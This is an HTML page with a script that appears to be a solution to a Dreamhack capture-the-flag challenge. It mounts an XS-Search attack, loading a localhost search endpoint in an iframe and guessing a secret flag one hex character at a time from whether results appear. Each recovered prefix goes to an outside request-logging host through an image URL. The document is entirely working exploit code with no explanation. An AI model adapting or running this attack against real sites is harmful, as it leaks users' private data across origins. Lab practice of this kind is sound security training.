<iframe id="iframe"></iframe>
<img id="img">
<script>
    async function req(url) {
        return await new Promise((resolve, reject) => {
            var iframe = document.getElementById("iframe");
            iframe.src = url;
            document.body.appendChild(iframe);

            iframe.onload = function() {
                // 내부 윈도우의 문서에서 <div> 요소들을 선택
                var divElements = iframe.contentWindow.document.querySelectorAll('div');
                if (divElements.length == 0) {
                    return reject();
                } else {
                    return resolve();
                }
            };    
        });
    }
    async function search(query) {
        try {
            await req(
              `https://localhost:8000/search?keyword=${query}`
            );
            return true;
        } catch (e) {
            return false;
        }
    }
    async function exploit() {
        let chars = "0123456789abcdef}"
        let secret = "DH{";
        while (!secret.includes("}")) {
            for (let c of chars) {
                if (await search(secret + c)) {
                    secret += c;
                    img.src = `https://enmexkr.request.dreamhack.games/${secret}`;
                    break;
                }
            }
        }
    }
    exploit();
</script>
